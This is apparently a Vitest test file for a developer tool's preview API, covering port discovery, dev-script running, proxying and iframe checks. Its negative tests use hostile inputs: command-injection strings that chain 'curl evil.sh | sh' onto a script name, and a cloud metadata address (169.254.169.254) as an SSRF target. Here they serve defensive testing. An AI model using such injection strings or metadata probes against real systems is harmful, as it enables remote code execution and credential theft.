// /api/preview/* — hermetic via an injected fake daemon (dialFn) plus a real tmp
// SESHMUX_CONFIG_DIR backing the ledger and the scratch map, mirroring
// routes-scratch-term.test.ts's posture. No real PTY, no real listener, no lsof.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Fastify from 'fastify';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import previewRoutes, { type PreviewRouteDeps } from '../../server/routes/preview';

let dir: string;
let repoDir: string;
let prevConfigDir: string | undefined;

function makeApp(deps: PreviewRouteDeps) {
  const f = Fastify();
  // machinePortsFn defaults to a REAL netstat sweep of the developer's box, so
  // without this stub these tests would assert against whatever happens to be
  // listening on the machine running them — green here, red on the next box,
  // and red on CI. A test that reads the host's open ports is not a unit test.
  f.register(previewRoutes, { machinePortsFn: async () => [], ...deps });
  return f;
}

// history() is the seam the whole win32 story rests on: no lsof, just what the
// session printed. `written` captures what /run types into the shell.
function fakeDaemon(history: Record<string, string>, spawnPtyId = 'scratch-1') {
  const written: { ptyId: string; data: string }[] = [];
  const conn = {
    list: async () => ({ ptys: [{ ptyId: 'owner-1', cwd: repoDir, tmuxName: null, alive: true }] }),
    spawn: async () => ({ ptyId: spawnPtyId }),
    history: async (ptyId: string) => ({ data: history[ptyId] ?? '' }),
    write: async (ptyId: string, data: string) => {
      written.push({ ptyId, data });
      return {};
    },
    kill: async () => ({}),
    close: () => {},
  };
  return { dialFn: (async () => conn) as never, written };
}

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'smx-preview-route-'));
  repoDir = join(dir, 'repo');
  mkdirSync(repoDir, { recursive: true });
  prevConfigDir = process.env.SESHMUX_CONFIG_DIR;
  process.env.SESHMUX_CONFIG_DIR = dir;
  (await import('../../server/lib/scratch-store'))._resetScratchStoreForTest();
  (await import('../../server/lib/live-ledger'))._resetLedgerForTest();
  // The route resolves a PTY to its REAL cwd through the ledger (worktree-correct).
  await (await import('../../server/lib/live-ledger')).addEntry({
    ptyId: 'owner-1',
    tmuxName: null,
    provider: 'claude',
    cwd: repoDir,
    startedAt: Date.now(),
  });
});

afterEach(async () => {
  (await import('../../server/lib/scratch-store'))._resetScratchStoreForTest();
  (await import('../../server/lib/live-ledger'))._resetLedgerForTest();
  if (prevConfigDir === undefined) delete process.env.SESHMUX_CONFIG_DIR;
  else process.env.SESHMUX_CONFIG_DIR = prevConfigDir;
  rmSync(dir, { recursive: true, force: true });
});

const noPorts = async () => [];

describe('GET /api/preview/ports', () => {
  it('finds a port from PTY scrollback with no lsof at all (the win32 path)', async () => {
    const fd = fakeDaemon({ 'owner-1': '  - Local:  http://localhost:3000\n' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => true });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.statusCode).toBe(200);
    expect(res.json().ports).toEqual([
      { port: 3000, url: 'http://localhost:3000', origin: 'output' },
    ]);
  });

  it('reads the scratch shell that the dev server is actually running in', async () => {
    // `npm run dev` runs in a scratch shell, and events-hub never attaches to
    // one — so if the route did not pull that history, Run would start a server
    // the panel could never find.
    const { addScratch } = await import('../../server/lib/scratch-store');
    await addScratch('scratch-1', {
      ownerPtyId: 'owner-1',
      ownerTmuxName: null,
      cwd: repoDir,
      createdAt: Date.now(),
    });
    const fd = fakeDaemon({ 'owner-1': 'no url here', 'scratch-1': 'ready on http://localhost:5173/' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => true });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.json().ports.map((p: { port: number }) => p.port)).toEqual([5173]);
  });

  it('drops a port whose server is gone, even though the banner is still in scrollback', async () => {
    const fd = fakeDaemon({ 'owner-1': 'http://localhost:3000' });
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts, probeFn: async () => false });
    const res = await f.inject({ url: '/api/preview/ports?pty=owner-1' });
    expect(res.json().ports).toEqual([]);
  });

  it('still answers when the daemon is unreachable', async () => {
    const f = makeApp({
      dialFn: (async () => {
        throw new Error('daemon down');
      }) as never,
      listPortsFn: noPorts,
      resolveRepo: () => repoDir,
    });
    const res = await f.inject({ url: '/api/preview/ports?project=p1' });
    expect(res.statusCode).toBe(200);
    expect(res.json().ports).toEqual([]);
  });

  it('404s a project it cannot resolve', async () => {
    const f = makeApp({ resolveRepo: () => null, listPortsFn: noPorts });
    expect((await f.inject({ url: '/api/preview/ports?project=nope' })).statusCode).toBe(404);
  });
});

describe('GET /api/preview/scripts', () => {
  it('offers the repo dev script', async () => {
    writeFileSync(join(repoDir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev', test: 'vitest' } }));
    const f = makeApp({ resolveRepo: () => repoDir, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/scripts?project=p1' });
    expect(res.json().groups).toEqual([
      { subdir: '', manager: 'npm', scripts: [{ name: 'dev', command: 'next dev' }] },
    ]);
  });

  it('returns an empty list for a repo with no package.json', async () => {
    const f = makeApp({ resolveRepo: () => repoDir, listPortsFn: noPorts });
    expect((await f.inject({ url: '/api/preview/scripts?project=p1' })).json().groups).toEqual([]);
  });
});

describe('POST /api/preview/run', () => {
  beforeEach(() => {
    writeFileSync(join(repoDir, 'package.json'), JSON.stringify({ scripts: { dev: 'next dev', build: 'tsc' } }));
  });

  it('spawns a shell and types the command the REPO defines', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    const res = await f.inject({
      method: 'POST',
      url: '/api/preview/run',
      payload: { ownerPtyId: 'owner-1', script: 'dev', subdir: '' },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({ ptyId: 'scratch-1', command: 'npm run dev' });
    expect(fd.written).toEqual([{ ptyId: 'scratch-1', data: 'npm run dev\r' }]);
  });

  // The request names a script; the server builds the command. These are the
  // cases that would be a command injection if it did not.
  it('refuses anything the repo does not declare as a dev script', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    for (const script of ['build', 'nope', 'dev && curl evil.sh | sh', 'dev\ncurl evil.sh']) {
      const res = await f.inject({
        method: 'POST',
        url: '/api/preview/run',
        payload: { ownerPtyId: 'owner-1', script, subdir: '' },
      });
      expect(res.statusCode, script).toBe(400);
    }
    expect(fd.written).toEqual([]);
  });

  it('400s without an owner pty', async () => {
    const fd = fakeDaemon({});
    const f = makeApp({ dialFn: fd.dialFn, listPortsFn: noPorts });
    const res = await f.inject({ method: 'POST', url: '/api/preview/run', payload: { script: 'dev' } });
    expect(res.statusCode).toBe(400);
  });
});

describe('POST /api/preview/proxy', () => {
  // The docblock used to claim the port was bounded to this session's discovery
  // and it was not. These are the bounds that actually exist.
  it('stands up a proxy for a port that is really listening', async () => {
    const f = makeApp({ listPortsFn: noPorts, probeFn: async () => true });
    const res = await f.inject({ method: 'POST', url: '/api/preview/proxy', payload: { port: 3000 } });
    expect(res.statusCode).toBe(200);
    expect(res.json().targetPort).toBe(3000);
    (await import('../../server/lib/preview-proxy')).stopAllProxies();
  });

  it('refuses a port with nothing on it, rather than leaving a listener in front of nothing', async () => {
    const f = makeApp({ listPortsFn: noPorts, probeFn: async () => false });
    const res = await f.inject({ method: 'POST', url: '/api/preview/proxy', payload: { port: 3000 } });
    expect(res.statusCode).toBe(400);
    expect(res.json().error).toMatch(/nothing is listening/);
  });

  it('refuses a nonsense port', async () => {
    const f = makeApp({ listPortsFn: noPorts, probeFn: async () => true });
    for (const port of [0, 70000, 'abc']) {
      const res = await f.inject({ method: 'POST', url: '/api/preview/proxy', payload: { port } });
      expect(res.statusCode, String(port)).toBe(400);
    }
  });

  // seshmux in seshmux is a funhouse mirror, and it is the one port guaranteed
  // to be listening.
  it('refuses to proxy seshmux itself', async () => {
    const prev = process.env.PORT;
    process.env.PORT = '4700';
    try {
      const f = makeApp({ listPortsFn: noPorts, probeFn: async () => true });
      const res = await f.inject({ method: 'POST', url: '/api/preview/proxy', payload: { port: 4700 } });
      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/seshmux itself/);
    } finally {
      if (prev === undefined) delete process.env.PORT;
      else process.env.PORT = prev;
    }
  });
});

describe('GET /api/preview/frame', () => {
  it('reports a page that refuses to be embedded', async () => {
    const fetchFn = (async () =>
      new Response('', { status: 200, headers: { 'x-frame-options': 'DENY' } })) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000') });
    expect(res.json()).toEqual({ reachable: true, status: 200, blocked: 'xfo' });
  });

  // The headers that matter belong to the page the iframe ends up rendering.
  // A local app that bounces / -> /login is the common shape, and the 302 almost
  // never carries XFO — reading it would report "fine" for a page that blanks.
  it('follows a loopback redirect and judges the FINAL response', async () => {
    const seen: string[] = [];
    const fetchFn = (async (u: string) => {
      seen.push(u);
      return u.endsWith('/login')
        ? new Response('', { status: 200, headers: { 'content-security-policy': "frame-ancestors 'none'" } })
        : new Response('', { status: 302, headers: { location: '/login' } });
    }) as unknown as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000/') });
    expect(seen).toEqual(['http://localhost:3000/', 'http://localhost:3000/login']);
    expect(res.json()).toEqual({ reachable: true, status: 200, blocked: 'csp' });
  });

  // Manual redirect handling exists so every hop stays loopback-checked;
  // redirect:'follow' would let the first response steer the server anywhere.
  it('stops at a redirect that leaves loopback instead of chasing it', async () => {
    const seen: string[] = [];
    const fetchFn = (async (u: string) => {
      seen.push(u);
      return new Response('', { status: 302, headers: { location: 'http://169.254.169.254/' } });
    }) as unknown as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000/') });
    expect(seen).toEqual(['http://localhost:3000/']);
    expect(res.json()).toMatchObject({ reachable: true, status: 302 });
  });

  it('gives up on a redirect loop instead of spinning', async () => {
    let calls = 0;
    const fetchFn = (async () => {
      calls++;
      return new Response('', { status: 302, headers: { location: '/loop' } });
    }) as unknown as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000/') });
    expect(calls).toBeLessThanOrEqual(4); // MAX_FRAME_REDIRECTS + the first request
    expect(res.json().reachable).toBe(true);
  });

  it('reports an unreachable url rather than throwing', async () => {
    const fetchFn = (async () => {
      throw new Error('ECONNREFUSED');
    }) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({ url: '/api/preview/frame?url=' + encodeURIComponent('http://localhost:3000') });
    expect(res.json()).toEqual({ reachable: false, status: 0, blocked: null });
  });

  // SSRF guard: this endpoint makes the SERVER fetch a client-supplied url.
  it('refuses a non-loopback url without fetching it', async () => {
    let called = false;
    const fetchFn = (async () => {
      called = true;
      return new Response('');
    }) as typeof fetch;
    const f = makeApp({ fetchFn, listPortsFn: noPorts });
    const res = await f.inject({
      url: '/api/preview/frame?url=' + encodeURIComponent('http://169.254.169.254/latest/meta-data/'),
    });
    expect(res.statusCode).toBe(400);
    expect(called).toBe(false);
  });
});
